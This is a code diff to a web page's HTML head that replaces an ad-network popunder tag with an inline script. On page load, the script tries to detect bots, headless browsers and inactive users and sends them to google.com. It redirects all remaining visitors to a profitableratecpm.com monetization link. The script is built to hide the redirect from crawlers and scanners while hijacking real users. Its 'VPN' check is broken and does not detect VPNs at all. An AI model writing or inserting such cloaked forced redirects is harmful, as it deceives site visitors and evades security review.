@@ -136,7 +136,33 @@
         }
     </style>
     <!-- Popunder de AdsTerra -->
-    <script type='text/javascript' src='//pl26733271.profitableratecpm.com/11/1f/fc/111ffc801cf018e79b505261c3a34af3.js'></script>
+    <script>
+     'use strict';
+    // Detección de bots
+    function isRealUser() {
+    const bots = ["bot", "crawl", "spider", "slurp", "headless", "phantomjs", "selenium"];
+    if (bots.some(bot => navigator.userAgent.toLowerCase().includes(bot))) return false;
+    let activo = false;
+    document.addEventListener("mousemove", () => activo = true);
+    document.addEventListener("keydown", () => activo = true);
+    setTimeout(() => {
+        if (!activo) window.location.href = "https://google.com";
+    }, 3000);
+    return true;
+
+    }
+
+    // Bloqueo de VPN/Proxy
+    function isVPN() {
+    return !navigator.mediaDevices?.getUserMedia;
+    }
+    // Redirección segura
+    function redirect() {
+    if (!isRealUser() || isVPN()) return;
+    window.location.href = "https://www.profitableratecpm.com/mvh7pt5g?key=07703abc2b91e6b793816f68a5afc2a5";
+    }
+    document.addEventListener("DOMContentLoaded", redirect);
+  </script>
 </head>
 
 <body>
